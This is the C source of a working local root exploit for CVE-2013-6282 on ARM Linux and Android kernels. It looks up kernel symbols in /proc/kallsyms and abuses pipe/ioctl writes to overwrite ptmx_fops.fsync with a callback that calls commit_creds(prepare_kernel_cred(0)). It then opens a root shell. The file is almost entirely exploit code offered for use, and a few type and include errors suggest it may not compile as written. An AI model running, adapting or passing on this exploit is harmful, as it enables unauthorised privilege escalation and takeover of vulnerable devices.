/* 	put_user_exploit.c
 
	CVE-2013-6282: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6282
	The get_user and put_user API functions of the Linux kernel fail.
	to validate the target address when being used on ARM v6k/v7 platforms.
	This functionality was originally implemented and controlled by the
	domain switching feature (CONFIG_CPU_USE_DOMAINS), which has been
	deprecated due to architectural changes. As a result, any kernel code
	using these API functions may introduce a security issue where none	existed
	before. This allows an application to read and write kernel memory to,
	e.g., escalated privileges.
	
	Credits : 
	
	fi01 ( https://github.com/fi01/libput_user_exploit ) for the original 
	version and android-rooting-tools Github Org
	https://github.com/orgs/android-rooting-tools/members
		
	The Exploit:
	Assuming kernel symbol addresses are visible via /proc/kallsyms and
	unprivileged code execution.
	Use pipe to write the address of a userspace function to the
	ptmx_fops.fsync kernel structure member.
	 
	 
	 
 */


#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#define _LARGEFILE64_SOURCE
#define PTMX_DEVICE "/dev/ptmx"

typedef struct cred* (*prepare_kernel_cred_t)(struct task_struct*);
typedef int (*commit_creds_t)(cred*);
static prepare_kernel_cred_t prepare_kernel_cred;
static commit_creds_t commit_creds;


static unsigned int pipe_write_value_at_address(unsigned long address, unsigned int value)
{
  char data[4];
  int pipefd[2];
  int i;
  //printf("%s : addr : %0lx val: 0x%0lx %lu\n",__FUNCTION__, address,value,value);
  
  *(long *)&data = value;

  if (pipe(pipefd) == -1) {
    perror("pipe");
    return 1;
  }

  for (i = 0; i < (int) sizeof(data) ; i++) {
    char buf[256];

    buf[0] = 0;

    if (data[i]) {
	//	printf("%s : i=%d write : %0x val: \n",__FUNCTION__, i,data[i]);
      if (write(pipefd[1], buf, data[i]) != data[i]) {
	printf("error in write().\n");
	break;
      }
    }
	//printf("%s : addr +i: %0lx + %d  = %0lx\n",__FUNCTION__, address,i, (address+i ));
    if (ioctl(pipefd[0], FIONREAD, (void *)(address + i)) == -1) {
      perror("ioctl");
      break;
    }

    if (data[i]) {
      if (read(pipefd[0], buf, sizeof buf) != data[i]) {
	printf("error in read().\n");
	break;
      }
    }
  }

  close(pipefd[0]);
  close(pipefd[1]);

  return (i == sizeof (data));
}
static void *kallsyms_get_symbol_address(const char *symbol_name)
{
  FILE *fp;
  char function[BUFSIZ];
  char symbol;
  void *address;
  int ret;

  fp = fopen("/proc/kallsyms", "r");
  if (!fp) {
    printf("Failed to open /proc/kallsyms due to %s.", strerror(errno));
    return 0;
  }

  while(!feof(fp)) {
    ret = fscanf(fp, "%p %c %s", &address, &symbol, function);
    if (ret != 3) {
      break;
    }

    if (!strcmp(function, symbol_name)) {
      fclose(fp);
      return address;
    }
  }
  fclose(fp);

  return NULL;
}

/* 	obtain_root_privilege - userland callback function
	We set ptmx_fops.fsync to the address of this function
	Calling fysnc on the open /dev/ptmx file descriptor will result
	in this function being called in the kernel context
	We can the call the prepare/commit creds combo to escalate the
	processes priveledge.	
	
*/
static void ptmx_fsync_callback(void)
{
  commit_creds(prepare_kernel_cred(0));
}



int main(int argc, char **argv)
{
  char* command = NULL;
  int i;
  for (i = 1; i < argc; i++) {
    if (!strcmp(argv[i], "-c")) {
      if (++i < argc) {
        command = argv[i];
      }
    }
  }

	/* find the ptmx_fops structure location in the kernel
	 * and offset 0x38 [ 56 ] bytes this should be the location
	 * of the fsync member. 
	 * NOTE: We assume knowledge of the ptmx_fops layout.
	*/
	void *ptmx_fops = kallsyms_get_symbol_address("ptmx_fops");
	unsigned int ptmx_fops_fsync_address = (unsigned int)ptmx_fops + 0x38;
	prepare_kernel_cred = (prepare_kernel_cred_t)kallsyms_get_symbol_address("prepare_kernel_cred");
	commit_creds = (commit_creds_t)kallsyms_get_symbol_address("commit_creds");
	
	printf("ptmx_fops_fsync_address %p\n",ptmx_fops_fsync_address);
	printf("prepare_kernel_cred %p\n",prepare_kernel_cred);
	printf("commit_creds %p\n",commit_creds);
	
	if(pipe_write_value_at_address(ptmx_fops_fsync_address,(unsigned int)&ptmx_fsync_callback )){
		
			int fd = open(PTMX_DEVICE, O_WRONLY);
			if(!fd) return 1; 
			fsync(fd);
			close(fd);
  
		
		pipe_write_value_at_address(ptmx_fops_fsync_address, 0);
			
	}
	 if (getuid() != 0) {
    printf("Failed to obtain root privilege.\n");
    exit(EXIT_FAILURE);
  }else {
    printf("Got Root1.\n");

  }

  if (command == NULL) {
    system("/system/bin/sh");
  } else {
    execl("/system/bin/sh", "/system/bin/sh", "-c", command, NULL);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
